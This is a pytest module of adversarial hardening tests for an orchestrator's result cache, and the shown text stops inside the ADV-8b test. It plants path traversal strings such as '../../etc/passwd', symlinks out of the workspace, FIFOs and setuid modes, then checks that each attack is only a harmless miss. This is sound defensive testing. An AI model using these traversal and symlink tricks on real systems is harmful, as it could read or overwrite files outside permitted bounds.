"""T-JCOAsq Part 2: adversarial hardening at INTEGRATION level (HLD 18.1: ADV-1..ADV-10, ADV-4b).

Every attack is mounted against the cache DIRECTORY or the WORKSPACE of a real, previously primed
cache and then driven through a REAL lookup / restore / store by a real `Orchestrator` (the unit
owners prove the same defences function by function: `test_restore.py`, `test_store_hardening.py`,
`test_keys.py`, `test_types.py`). The threat ids (M-n) are those of HLD 7.7.

What each test pins, besides the miss reason, is what the attack must NOT achieve:
  * a "victim" directory/file outside the cache is byte-for-byte untouched (content, size,
    mtime_ns of every entry and of every directory: nothing read through a link is later written,
    `utime`d or unlinked);
  * the planted link / forged entry is handled the way D33 says (an unsafe path is never evicted;
    forged content is evicted);
  * the task still runs to success: a cache attack costs a miss, never a failure.
Dispatch counts come from the counting executor; "outputs untouched" is asserted INSIDE the
dispatch (an executor hook) so a half-restored file cannot be hidden by the agent overwriting it.
"""

from __future__ import annotations

import hashlib
import io
import json
import os
import stat
import sys
import threading
from collections.abc import Callable
from pathlib import Path
from typing import Any

import pytest
from typer.testing import CliRunner

from agent_orchestrator.cache import constants as c
from agent_orchestrator.cache.restore import restore_outputs
from agent_orchestrator.cache.store import LocalFsCacheStore
from agent_orchestrator.cache.types import CacheIntegrityError, RestoreMiss
from agent_orchestrator.cli import app
from agent_orchestrator.models import RunState
from tests.cache._hardening_rig import HookedExecutor, Rig
from tests.cache.fakes import make_entry
from tests.cache.test_engine_result_cache import CostlyFakeExecutor, single, task, workflow

CORPUS_DIR = Path(__file__).resolve().parents[1] / "fixtures" / "result_cache" / "corpus"
CORPUS_MANIFEST = CORPUS_DIR / "MANIFEST.json"
WATCHDOG_SECONDS = 5.0
BODY = b"fake output for a\n"
OUT = "out/a.txt"
needs_symlinks = pytest.mark.skipif(sys.platform == "win32", reason="symlinks need POSIX")
needs_fifo = pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="no os.mkfifo on this platform")
Tree = dict[str, tuple[int, int, int, str | None]]


@pytest.fixture(autouse=True)
def _env(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    monkeypatch.delenv(c.ENV_CACHE, raising=False)
    monkeypatch.setenv("AO_WORKSPACE_ROOT", str(tmp_path))
    monkeypatch.setenv("AO_STATE_DIR", str(tmp_path / "ao-state"))


@pytest.fixture
def rig(tmp_path: Path) -> Rig:
    ws = tmp_path / "ws"
    ws.mkdir()
    return Rig(ws)


@pytest.fixture
def victim(tmp_path: Path) -> Path:
    """A directory OUTSIDE the workspace that no attack may read-through-then-modify."""
    path = tmp_path / "victim"
    path.mkdir()
    return path


# ------------------------------------------------------------------------------------ helpers
def _called_by_coverage() -> bool:
    """True when `coverage.py`'s tracer is on the call stack.

    Under `--cov` (the CI step) the tracer calls `os.path.realpath` -> `os.lstat` for every
    source file it sees for the first time, and that happens on the stack of whatever code is
    running. A blanket `os` tripwire must not mistake the tooling for the code under test.
    """
    frame = sys._getframe(2)
    while frame is not None:
        if f"{os.sep}coverage{os.sep}" in frame.f_code.co_filename:
            return True
        frame = frame.f_back  # type: ignore[assignment]
    return False


def snapshot(root: Path) -> Tree:
    """Everything observable about *root*'s tree: kind, size, mtime_ns, and file content digest.
    Directory mtimes are included, so a created/removed/renamed child shows up."""
    tree: Tree = {}
    for path in [root, *sorted(root.rglob("*"))]:
        st = path.lstat()
        digest = None
        if stat.S_ISREG(st.st_mode):
            digest = hashlib.sha256(path.read_bytes()).hexdigest()
        tree[str(path.relative_to(root))] = (
            stat.S_IFMT(st.st_mode),
            st.st_size,
            st.st_mtime_ns,
            digest,
        )
    return tree


def file_state(path: Path) -> tuple[bytes, int]:
    return path.read_bytes(), path.stat().st_mtime_ns


def prime(rig: Rig, wf: Any | None = None) -> tuple[Any, str, bytes]:
    """Run once (miss -> store), then delete the outputs so a second run would be a hit.

    Returns the workflow, the entry key and the entry's bytes.
    """
    wf = wf or single()
    state = rig.run(wf, CostlyFakeExecutor())
    assert state.result_cache["a"].stored is True
    entry = rig.only_entry()
    rig.delete_outputs(OUT)
    return wf, rig.only_key(), entry.read_bytes()


class Probe:
    """An executor whose dispatch records what the workspace looked like when the agent started:
    proof that the cache wrote nothing (or only what it should) BEFORE the agent ran."""

    def __init__(self, rig: Rig, *paths: str) -> None:
        self.rig, self.paths = rig, paths
        self.seen: list[dict[str, bool]] = []
        self.executor = HookedExecutor(hooks={"a": self._look})

    def _look(self, ctx: Any) -> None:
        self.seen.append({p: self.rig.out(p).exists() for p in self.paths})


def leftover_staging_files(ws: Path) -> list[str]:
    """Restore staging / backup names left in the workspace (a clean restore leaves none)."""
    return sorted(
        str(p.relative_to(ws))
        for p in ws.rglob(f"{c.RESTORE_TMP_PREFIX}*")
        if ".orchestrator" not in p.parts
    )


def run_bounded(fn: Callable[[], Any], seconds: float = WATCHDOG_SECONDS) -> Any:
    """Run *fn* in a daemon thread and fail (never hang) if it does not return: the FIFO guard."""
    box: list[Any] = []

    def target() -> None:
        try:
            box.append(("ok", fn()))
        except BaseException as exc:  # re-raised in the caller below
            box.append(("err", exc))

    t = threading.Thread(target=target, name="bounded", daemon=True)
    t.start()
    t.join(seconds)
    assert not t.is_alive(), f"hung for more than {seconds}s (a FIFO was opened blocking?)"
    kind, value = box[0]
    if kind == "err":
        raise value
    return value


def miss_reason(state: RunState, tid: str = "a") -> tuple[str, str | None]:
    rec = state.result_cache[tid]
    return rec.outcome, rec.reason


def entry_json(rig: Rig) -> dict[str, Any]:
    data = json.loads(rig.only_entry().read_text())
    assert isinstance(data, dict)
    return data


def write_entry_json(rig: Rig, data: Any) -> None:
    rig.only_entry().write_text(json.dumps(data, sort_keys=True))


def assert_attack_cost_one_miss(
    rig: Rig, state: RunState, ex: CostlyFakeExecutor, reason: str
) -> None:
    """The common outcome of a forged / corrupt entry: a miss with the expected reason, the agent
    ran and succeeded, and the correct bytes are on disk."""
    assert state.status == "succeeded" and ex.executed == ["a"]
    assert miss_reason(state) == ("miss", reason)
    assert rig.out(OUT).read_bytes() == BODY


# ====================================================================================== ADV-1
class TestAdv1PathTraversalOnRestore:
    """M-1 (CWE-22): a manifest that names anything but the spec-derived destinations is a miss
    plus an eviction; no file is written outside the workspace (or anywhere unexpected)."""

    @staticmethod
    def forged_paths(victim: Path) -> dict[str, list[str]]:
        return {
            "dot_dot": ["../escape.txt"],
            "nested_dot_dot": ["out/../../escape.txt"],
            "absolute": [str(victim / "escape.txt")],
            "extra_entry": [OUT, "../escape.txt"],
            "missing_declared_entry": ["somewhere/else.txt"],
            "duplicate_entry": [OUT, OUT],
            "unnormalised_alias": ["./out//a.txt"],  # the same file, spelled differently
        }

    @pytest.mark.parametrize(
        "variant",
        [
            "dot_dot",
            "nested_dot_dot",
            "absolute",
            "extra_entry",
            "missing_declared_entry",
            "duplicate_entry",
            "unnormalised_alias",
        ],
    )
    def test_adv1_forged_manifest_paths_write_nothing_and_are_evicted(
        self, rig: Rig, victim: Path, variant: str
    ) -> None:
        wf, key, _ = prime(rig)
        data = entry_json(rig)
        real = data["outputs"][0]
        data["outputs"] = [{**real, "path": p} for p in self.forged_paths(victim)[variant]]
        write_entry_json(rig, data)  # the blob behind every path is REAL: a bug would write it
        outside_before = (snapshot(victim), sorted(p.name for p in rig.ws.parent.iterdir()))
        ws_before = sorted(
            str(p.relative_to(rig.ws)) for p in rig.ws.rglob("*") if ".orchestrator" not in p.parts
        )

        probe = Probe(rig, OUT)
        state = rig.run(wf, probe.executor)

        assert probe.seen == [{OUT: False}]  # nothing restored before the agent ran
        assert_attack_cost_one_miss(rig, state, probe.executor, c.REASON_MANIFEST_MISMATCH)
        assert snapshot(victim) == outside_before[0]
        assert sorted(p.name for p in rig.ws.parent.iterdir()) == outside_before[1]
        ws_after = sorted(
            str(p.relative_to(rig.ws)) for p in rig.ws.rglob("*") if ".orchestrator" not in p.parts
        )
        assert [p for p in ws_after if p not in ws_before] == [OUT]  # only the AGENT's output
        assert not (rig.ws.parent / "escape.txt").exists()
        assert [e["key"] for e in rig.log_events(state, "cache.evict")][:1] == [key]
        assert [e["reason"] for e in rig.log_events(state, "cache.corrupt")] == [
            c.REASON_MANIFEST_MISMATCH
        ]
        assert leftover_staging_files(rig.ws) == []


# ====================================================================================== ADV-2
class TestAdv2KeySplicing:
    """M-2: no attacker-chosen string ever becomes a path component. Keys and shas are matched
    against a hex regex BEFORE any path is built, in the store, in forged entries and in CLI
    arguments."""

    SPLICED = ["../escape", "../../etc/passwd", "ab/../../x", "A" * 64, "g" * 64, "ab", "", "a/b"]

    @pytest.mark.parametrize("bad", SPLICED)
    def test_adv2_every_store_operation_rejects_a_spliced_key_before_touching_the_filesystem(
        self, rig: Rig, monkeypatch: pytest.MonkeyPatch, bad: str
    ) -> None:
        prime(rig)
        store = rig.cache_store
        touched: list[str] = []

        def tripwire(name: str) -> Callable[..., Any]:
            real = getattr(os, name)

            def spy(*a: Any, **kw: Any) -> Any:
                if _called_by_coverage():  # the tracer resolves paths of newly seen files
                    return real(*a, **kw)
                touched.append(f"{name}{a[:1]}")
                raise AssertionError(f"filesystem touched: {name}")

            return spy

        for fn in ("lstat", "stat", "open", "unlink", "utime", "listdir", "scandir"):
            monkeypatch.setattr(os, fn, tripwire(fn))
        now = rig.clock()
        for op in (
            lambda: store.get_entry(bad),
            lambda: store.touch_entry(bad, now),
            lambda: store.delete_entry(bad),
            lambda: store.has_blob(bad),
            lambda: store.read_blob(bad, io.BytesIO(), max_bytes=1),
            lambda: store.delete_blob(bad),
        ):
            with pytest.raises(ValueError):
                op()
        assert touched == []

    def test_adv2_an_entry_whose_content_key_differs_from_its_file_name_is_key_mismatch(
        self, rig: Rig, victim: Path
    ) -> None:
        wf, key, _ = prime(rig)
        data = entry_json(rig)
        data["key"] = "f" * 64  # a valid-looking key that is not the file's
        write_entry_json(rig, data)
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_KEY_MISMATCH)
        assert [e["reason"] for e in rig.log_events(state, "cache.corrupt")] == [
            c.REASON_KEY_MISMATCH
        ]
        assert not (rig.entry_dir("f" * 64) / ("f" * 64 + ".json")).exists()  # nothing spliced

    @pytest.mark.parametrize("field", ["sha256", "key"])
    def test_adv2_a_traversal_string_in_a_hex_field_makes_the_entry_corrupt(
        self, rig: Rig, field: str
    ) -> None:
        wf, key, _ = prime(rig)
        data = entry_json(rig)
        if field == "sha256":
            data["outputs"][0]["sha256"] = "../../../../../etc/passwd"
        else:
            data["key"] = "../" + data["key"][3:]
        write_entry_json(rig, data)
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        reason = c.REASON_CORRUPT_ENTRY
        assert_attack_cost_one_miss(rig, state, ex, reason)
        assert [e["key"] for e in rig.log_events(state, "cache.evict")][:1] == [key]

    @pytest.mark.parametrize(
        "arg", ["../escape", "../../etc/passwd", "ab/../../x", "*", "ab/", "G" * 8, ""]
    )
    def test_adv2_ao_cache_rm_and_show_refuse_a_spliced_argument(
        self, rig: Rig, victim: Path, arg: str
    ) -> None:
        _, key, _ = prime(rig)
        planted = victim / "sentinel.json"
        planted.write_text("{}")
        before = (snapshot(victim), snapshot(rig.cache_root))
        runner = CliRunner()
        # positive control: the very same commands work for a legitimate prefix
        ok = runner.invoke(app, ["cache", "show", key[:12], "--workspace", str(rig.ws)])
        assert ok.exit_code == 0, ok.output
        for cmd in ("rm", "show"):
            result = runner.invoke(app, ["cache", cmd, arg, "--workspace", str(rig.ws)])
            assert result.exit_code != 0, (cmd, arg, result.output)
        assert (snapshot(victim), snapshot(rig.cache_root)) == before  # nothing removed anywhere

    def test_adv2_planted_entry_names_are_never_read_or_deleted_by_a_lookup(self, rig: Rig) -> None:
        """Files whose NAMES are not valid keys (upper case, non-hex, encoded traversal) sitting
        in the entry shard directory are neither parsed nor evicted: only the computed key's
        file is ever opened."""
        wf, key, _ = prime(rig)
        shard = rig.entry_dir(key)
        junk = {
            "UPPERCASE.json": b"{}",
            "not-a-key.json": b"\xff\xfe",
            "..%2f..%2fescape.json": b"{}",
            f"{key}.json.bak": b"{}",
        }
        for name, body in junk.items():
            (shard / name).write_bytes(body)
        before = {name: file_state(shard / name) for name in junk}

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert ex.executed == [] and state.result_cache["a"].hit  # the real entry still serves
        assert {name: file_state(shard / name) for name in junk} == before
        assert rig.log_events(state, "cache.corrupt") == []


# ====================================================================================== ADV-3
class TestAdv3CorruptBlob:
    """M-3: size and sha are verified while staging; any mismatch is a miss, an eviction, a
    deleted blob and a `cache.corrupt` WARNING, and no destination is ever modified."""

    @staticmethod
    def damage(blob: Path, how: str) -> None:
        body = blob.read_bytes()
        if how == "bit_flip_same_size":
            blob.write_bytes(bytes([body[0] ^ 0x01]) + body[1:])
        elif how == "truncated":
            blob.write_bytes(body[: len(body) // 2])
        elif how == "extended":
            blob.write_bytes(body + b"EXTRA")
        elif how == "emptied":
            blob.write_bytes(b"")
        else:
            raise AssertionError(how)

    @pytest.mark.parametrize("how", ["bit_flip_same_size", "truncated", "extended", "emptied"])
    def test_adv3_a_damaged_blob_is_a_non_storable_miss_and_never_reaches_the_destination(
        self, rig: Rig, how: str
    ) -> None:
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        self.damage(blob, how)

        probe = Probe(rig, OUT)
        state = rig.run(wf, probe.executor)

        assert probe.seen == [{OUT: False}]
        assert_attack_cost_one_miss(rig, state, probe.executor, c.REASON_BLOB_CORRUPT)
        assert state.result_cache["a"].stored is False  # a restore-time miss is never storable
        assert rig.entry_files() == [] and rig.blob_files() == []  # entry AND blob deleted
        events = rig.log_events(state, "cache.corrupt")
        assert [(e["reason"], e["key"]) for e in events] == [(c.REASON_BLOB_CORRUPT, key)]
        assert events[0]["blob"] == blob.name
        assert leftover_staging_files(rig.ws) == []

    def test_adv3_a_missing_blob_is_a_miss_and_the_dangling_entry_is_evicted(
        self, rig: Rig
    ) -> None:
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        blob.unlink()
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)
        assert_attack_cost_one_miss(rig, state, ex, c.REASON_BLOB_MISSING)
        assert rig.entry_files() == []


# ===================================================================================== ADV-4
def move_aside(path: Path, victim: Path, name: str) -> Path:
    """Move a real cache directory into the victim area and leave a symlink in its place."""
    target = victim / name
    os.replace(path, target)
    os.symlink(target, path)
    return target


@needs_symlinks
class TestAdv4SymlinkedCacheComponents:
    """M-4 (CWE-59): a persistent link planted in the cache is never followed, and never
    unlinked THROUGH. A real lookup costs a miss; the victim is byte-for-byte untouched."""

    def test_adv4_a_symlinked_cache_root_is_store_unavailable_and_nothing_is_written_through_it(
        self, rig: Rig, victim: Path
    ) -> None:
        wf, key, _ = prime(rig)
        target = move_aside(rig.cache_root, victim, "cache-root")
        before = snapshot(victim)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_STORE_UNAVAILABLE)
        assert state.result_cache["a"].stored is False
        assert snapshot(victim) == before  # not read-then-modified, nothing added
        assert rig.cache_root.is_symlink() and rig.cache_root.resolve() == target
        warn = [e for e in rig.log_events(state, "cache.skip") if e.get("phase") == "lookup"]
        assert [e["reason"] for e in warn] == [c.REASON_STORE_UNAVAILABLE]
        assert rig.log_events(state, "cache.hit") == []

    def test_adv4_a_symlinked_blob_is_corrupt_and_only_the_link_is_removed(
        self, rig: Rig, victim: Path
    ) -> None:
        """The link points at a victim file holding the CORRECT bytes: a follower would restore
        them and succeed. Instead: miss, link unlinked (not its target), victim untouched."""
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        target = victim / "payload"
        target.write_bytes(blob.read_bytes())
        blob.unlink()
        os.symlink(target, blob)
        before = snapshot(victim)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_BLOB_CORRUPT)
        assert snapshot(victim) == before and target.read_bytes() == BODY
        assert not blob.exists() and not blob.is_symlink()  # the LINK was deleted

    def test_adv4_a_symlinked_blob_shard_is_unsafe_path_the_entry_stays_and_victim_is_intact(
        self, rig: Rig, victim: Path
    ) -> None:
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        shard = blob.parent
        target = move_aside(shard, victim, "blob-shard")
        before = snapshot(victim)
        entry_before = file_state(rig.only_entry())

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_UNSAFE_PATH)
        assert state.result_cache["a"].stored is False
        assert snapshot(victim) == before and shard.is_symlink() and shard.resolve() == target
        assert file_state(rig.only_entry()) == entry_before  # D33: NOT evicted, not touched
        assert rig.log_events(state, "cache.evict") == []
        assert [e["reason"] for e in rig.log_events(state, "cache.corrupt")] == [
            c.REASON_UNSAFE_PATH
        ]

    def test_adv4_a_symlinked_entry_file_is_corrupt_and_only_the_link_is_removed(
        self, rig: Rig, victim: Path
    ) -> None:
        wf, key, entry_bytes = prime(rig)
        path = rig.only_entry()
        target = victim / "entry.json"
        target.write_bytes(entry_bytes)  # a perfectly valid entry for this very key
        path.unlink()
        os.symlink(target, path)
        before = snapshot(victim)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_CORRUPT_ENTRY)
        assert snapshot(victim) == before and target.read_bytes() == entry_bytes
        assert not path.is_symlink()  # replaced: evicted, then re-stored as a regular file
        assert state.result_cache["a"].stored is True
        assert stat.S_ISREG(path.lstat().st_mode)


@needs_symlinks
class TestAdv4bPlantedLinkDuringARealLookup:
    """ADV-4b (D33): a symlinked entry SHARD or `entries/v1` directory, holding a valid copy of
    the entry, planted before a real lookup. Miss `unsafe_path`; the victim directory is
    untouched (nothing read-then-`utime`d, nothing unlinked, nothing created); the entry is NOT
    evicted; the link itself survives."""

    @pytest.mark.parametrize("which", ["shard", "entries_v1"])
    def test_adv4b_planted_symlinked_directory(self, rig: Rig, victim: Path, which: str) -> None:
        wf, key, entry_bytes = prime(rig)
        shard = rig.entry_dir(key)
        planted = shard if which == "shard" else shard.parent
        target = move_aside(planted, victim, f"entries-{which}")
        copy = target / f"{key}.json" if which == "shard" else target / key[:2] / f"{key}.json"
        assert copy.read_bytes() == entry_bytes  # the victim really holds the valid entry
        before = snapshot(victim)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_UNSAFE_PATH)
        rec = state.result_cache["a"]
        assert (rec.stored, rec.store_reason) == (False, None)  # not storable: no write attempted
        assert snapshot(victim) == before  # untouched, incl. the mtime of the entry copy
        assert planted.is_symlink() and planted.resolve() == target  # the link was not "evicted"
        assert copy.exists() and copy.read_bytes() == entry_bytes  # the entry was not evicted
        assert rig.log_events(state, "cache.evict") == []
        corrupt = rig.log_events(state, "cache.corrupt")
        assert [(e["reason"], e["key"]) for e in corrupt] == [(c.REASON_UNSAFE_PATH, key)]
        assert corrupt[0]["level"] == "WARNING"
        assert rig.log_events(state, "cache.hit") == []  # the victim's entry was never served
        assert state.tasks["a"].attempts == 1

    def test_adv4b_a_later_run_after_the_link_is_removed_works_again(
        self, rig: Rig, victim: Path
    ) -> None:
        """The attack is not sticky: remove the plant and the (never evicted) entry serves."""
        wf, key, _ = prime(rig)
        shard = rig.entry_dir(key)
        target = move_aside(shard, victim, "shard")
        rig.run(wf, CostlyFakeExecutor())
        rig.delete_outputs(OUT)
        shard.unlink()  # remove the link, move the directory back
        os.replace(target, shard)
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)
        assert ex.executed == [] and state.result_cache["a"].hit


# ===================================================================================== ADV-5
@needs_symlinks
class TestAdv5LinksAtInputsAndOutputs:
    """M-5 (CWE-59): links in the WORKSPACE side. Inputs with links make the task uncacheable;
    capture refuses a non-regular output; restore re-validates the destination."""

    def test_adv5_a_symlink_inside_an_input_directory_makes_the_task_uncacheable(
        self, rig: Rig, victim: Path
    ) -> None:
        (rig.ws / "data").mkdir()
        (rig.ws / "data" / "real.txt").write_text("real\n")
        secret = victim / "secret.txt"
        secret.write_text("outside\n")
        os.symlink(secret, rig.ws / "data" / "link.txt")
        wf = workflow([task("a", inputs=["data"], outputs=[OUT])])
        before = snapshot(victim)

        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)

        assert state.status == "succeeded" and ex.executed == ["a"]
        assert miss_reason(state) == ("ineligible", c.REASON_INPUT_NOT_REGULAR)
        assert rig.entry_files() == [] and snapshot(victim) == before
        # and a second run does not "hit" on anything: still ineligible, still dispatched
        rig.delete_outputs(OUT)
        ex2 = CostlyFakeExecutor()
        state2 = rig.run(wf, ex2)
        assert ex2.executed == ["a"] and miss_reason(state2)[0] == "ineligible"

    def test_adv5_an_output_replaced_by_a_symlink_during_the_run_is_not_stored(
        self, rig: Rig
    ) -> None:
        """The link stays INSIDE the workspace (the engine itself fails a task whose output
        resolves outside it): capture must still refuse to read through it into the blob store."""
        secret = rig.ws / "private" / "secret.txt"
        secret.parent.mkdir()
        secret.write_text("a secret that is not this task's output\n")
        secret_state = file_state(secret)

        def swap_for_link(ctx: Any) -> None:  # after the agent wrote the real file
            os.unlink(rig.out(OUT))
            os.symlink(secret, rig.out(OUT))

        ex = HookedExecutor(after={"a": swap_for_link})
        state = rig.run(single(), ex)

        rec = state.result_cache["a"]
        assert state.tasks["a"].status == "succeeded" and ex.executed == ["a"]
        # Guard 1 (the key recomputed at settle resolves the link to the secret's path) fires
        # before capture's own `output_not_regular_file` refusal would; either is a refusal.
        assert rec.stored is False
        assert rec.store_reason in (c.REASON_KEY_CHANGED_DURING_RUN, c.REASON_OUTPUT_NOT_REGULAR)
        assert rig.entry_files() == [] and rig.blob_files() == []  # the secret was never read
        assert file_state(secret) == secret_state

    def test_adv5_a_link_appearing_in_the_destination_path_before_restore_is_a_non_evicting_miss(
        self, rig: Rig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The key was built with `deep/` absent; a symlink named `deep` is planted right after
        (inside `get_entry`, i.e. between key build and restore). Restore re-validates the whole
        destination chain: nothing is staged or written into the link's target, and the (fine)
        entry is not evicted. The target stays inside the workspace so the ENGINE accepts the
        path and the run can finish."""
        wf = workflow([task("a", outputs=["deep/a.txt"])])
        rig.run(wf, CostlyFakeExecutor())
        entry_bytes = rig.only_entry().read_bytes()
        rig.delete_outputs("deep/a.txt")
        (rig.ws / "deep").rmdir()
        elsewhere = rig.ws / "elsewhere"
        elsewhere.mkdir()
        real_get = LocalFsCacheStore.get_entry

        def get_then_plant(self: LocalFsCacheStore, k: str) -> Any:
            entry = real_get(self, k)
            os.symlink(elsewhere, rig.ws / "deep")
            return entry

        monkeypatch.setattr(LocalFsCacheStore, "get_entry", get_then_plant)
        seen: list[list[str]] = []
        ex = HookedExecutor(hooks={"a": lambda ctx: seen.append(sorted(os.listdir(elsewhere)))})
        state = rig.run(wf, ex)

        assert state.status == "succeeded" and ex.executed == ["a"]
        assert miss_reason(state) == ("miss", c.REASON_RESTORE_FAILED)
        assert seen == [[]]  # when the agent started, the cache had written NOTHING through it
        assert rig.only_entry().read_bytes() == entry_bytes  # not evicted: the entry is fine
        assert rig.log_events(state, "cache.evict") == []
        assert leftover_staging_files(rig.ws) == []

    def test_adv5_an_output_directory_that_links_out_of_the_workspace_is_never_restored_into(
        self, rig: Rig, victim: Path
    ) -> None:
        """The engine's own path guard refuses such a task at dispatch (ArtifactPathError); the
        cache must already have declined: no hit, nothing written into the linked directory."""
        from agent_orchestrator.errors import ArtifactPathError

        wf, key, entry_bytes = prime(rig)
        target = victim / "out-dir"
        target.mkdir()
        out_dir = rig.ws / "out"
        out_dir.rmdir()
        os.symlink(target, out_dir)
        before = snapshot(victim)

        with pytest.raises(ArtifactPathError):  # raised by the ENGINE at dispatch, not the cache
            rig.run(wf, CostlyFakeExecutor())

        outcome = rig.cache.outcomes[-1]
        assert outcome.hit is False
        assert outcome.record is not None and outcome.record.outcome == "ineligible"
        assert outcome.record.reason == c.REASON_PATH_REJECTED
        assert snapshot(victim) == before
        assert rig.only_entry().read_bytes() == entry_bytes


# ===================================================================================== ADV-6
@needs_fifo
class TestAdv6Fifo:
    """M-6 (CWE-400): a FIFO anywhere the cache would read must never hang the run. Every case
    runs under a watchdog thread."""

    def test_adv6a_a_fifo_as_a_direct_input_is_not_regular_and_does_not_hang(
        self, rig: Rig
    ) -> None:
        (rig.ws / "data").mkdir()
        os.mkfifo(rig.ws / "data" / "in.fifo")
        wf = workflow([task("a", inputs=["data/in.fifo"], outputs=[OUT])])
        ex = CostlyFakeExecutor()
        state = run_bounded(lambda: rig.run(wf, ex))
        assert state.status == "succeeded" and ex.executed == ["a"]
        assert miss_reason(state) == ("ineligible", c.REASON_INPUT_NOT_REGULAR)
        assert rig.entry_files() == []

    def test_adv6b_a_fifo_inside_an_input_directory_is_not_regular_and_does_not_hang(
        self, rig: Rig
    ) -> None:
        (rig.ws / "data").mkdir()
        (rig.ws / "data" / "ok.txt").write_text("fine\n")
        os.mkfifo(rig.ws / "data" / "pipe")
        wf = workflow([task("a", inputs=["data"], outputs=[OUT])])
        ex = CostlyFakeExecutor()
        state = run_bounded(lambda: rig.run(wf, ex))
        assert state.status == "succeeded" and ex.executed == ["a"]
        assert miss_reason(state) == ("ineligible", c.REASON_INPUT_NOT_REGULAR)

    def test_adv6c_a_fifo_in_place_of_the_entry_file_is_corrupt_and_does_not_hang(
        self, rig: Rig
    ) -> None:
        wf, key, _ = prime(rig)
        path = rig.only_entry()
        path.unlink()
        os.mkfifo(path)
        ex = CostlyFakeExecutor()
        state = run_bounded(lambda: rig.run(wf, ex))
        assert_attack_cost_one_miss(rig, state, ex, c.REASON_CORRUPT_ENTRY)
        assert stat.S_ISREG(path.lstat().st_mode)  # the FIFO was evicted and replaced by a store

    def test_adv6c_a_fifo_in_place_of_a_blob_is_corrupt_and_does_not_hang(self, rig: Rig) -> None:
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        blob.unlink()
        os.mkfifo(blob)
        ex = CostlyFakeExecutor()
        state = run_bounded(lambda: rig.run(wf, ex))
        assert_attack_cost_one_miss(rig, state, ex, c.REASON_BLOB_CORRUPT)
        assert not blob.exists()  # the FIFO was deleted along with the entry


# ===================================================================================== ADV-7
class TestAdv7ResourceExhaustion:
    """M-7 (CWE-400): a lying `size`, a huge entry file and an oversized blob are bounded."""

    @pytest.mark.parametrize("claimed", [0, 1, 10**6, 2**40])
    def test_adv7_a_lying_size_field_is_never_trusted(self, rig: Rig, claimed: int) -> None:
        wf, key, _ = prime(rig)
        data = entry_json(rig)
        assert data["outputs"][0]["size"] == len(BODY) != claimed
        data["outputs"][0]["size"] = claimed
        write_entry_json(rig, data)

        probe = Probe(rig, OUT)
        state = rig.run(wf, probe.executor)

        # 2**40 exceeds the entry cap (corrupt_entry); every other lie is caught by the byte
        # count / digest check while staging (blob_corrupt). Either way: a miss, never a hit.
        reason = c.REASON_CORRUPT_ENTRY if claimed == 2**40 else c.REASON_BLOB_CORRUPT
        assert probe.seen == [{OUT: False}]
        assert_attack_cost_one_miss(rig, state, probe.executor, reason)
        assert leftover_staging_files(rig.ws) == []

    def test_adv7_an_oversized_entry_file_is_corrupt_and_is_never_read_past_the_bound(
        self, rig: Rig, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        wf, key, _ = prime(rig)
        path = rig.only_entry()
        with open(path, "r+b") as fh:  # a sparse file far larger than any legal entry
            fh.truncate(c.MAX_ENTRY_FILE_BYTES * 200)
        requested: list[int] = []
        real_read = os.read

        def spy(fd: int, n: int) -> bytes:
            requested.append(n)
            return real_read(fd, n)

        monkeypatch.setattr(os, "read", spy)
        ex = CostlyFakeExecutor()
        state = rig.run(wf, ex)
        monkeypatch.setattr(os, "read", real_read)

        assert_attack_cost_one_miss(rig, state, ex, c.REASON_CORRUPT_ENTRY)
        assert max(requested, default=0) <= c.MAX_ENTRY_FILE_BYTES + 1  # bounded reads only

    def test_adv7_a_blob_larger_than_its_entry_claims_is_not_written_to_the_workspace(
        self, rig: Rig
    ) -> None:
        wf, key, _ = prime(rig)
        (blob,) = rig.blob_files()
        blob.write_bytes(b"X" * 5_000_000)  # 5 MB behind a 18-byte claim
        probe = Probe(rig, OUT)
        state = rig.run(wf, probe.executor)
        assert probe.seen == [{OUT: False}]
        assert_attack_cost_one_miss(rig, state, probe.executor, c.REASON_BLOB_CORRUPT)
        assert leftover_staging_files(rig.ws) == []


# ===================================================================================== ADV-8
class TestAdv8ModeBits:
    """M-8: an entry can never make a restored file setuid / group / other writable."""

    def test_adv8a_a_setuid_mode_makes_the_entry_corrupt_and_no_such_file_is_created(
        self, rig: Rig
    ) -> None:
        wf, key, _ = prime(rig)
        data = entry_json(rig)
        data["outputs"][0]["mode"] = 0o4777
        write_entry_json(rig, data)

        probe = Probe(rig, OUT)
        state = rig.run(wf, probe.executor)

        assert probe.seen == [{OUT: False}]
        assert_attack_cost_one_miss(rig, state, probe.executor, c.REASON_CORRUPT_ENTRY)
        assert rig.out(OUT).stat().st_mode & stat.S_ISUID == 0

    def test_adv8b_a_world_writable_mode_is_restored_as_0o755(self, rig: Rig) -> None:
        def make_world_writable(ctx: Any) -> None:
            os.chmod(rig.out(OUT), 0o777)

        wf = single()
        state = rig.run(wf, HookedExecutor(after={"a": make_world_writable}))
        assert state.result_cache["a"].stored is True
        assert entry_json(rig)["outputs"][0]["mode"] == 0o777  # stored faithfully (<= 0o777)
        rig.delete_outputs(OUT)

        ex = CostlyFakeExecutor()
        again = rig.run(wf, ex)

        assert ex.executed == [] and again.result_cache["a"].hit
        mode = stat.S_IMODE(rig.out(OUT).stat().st_mode)
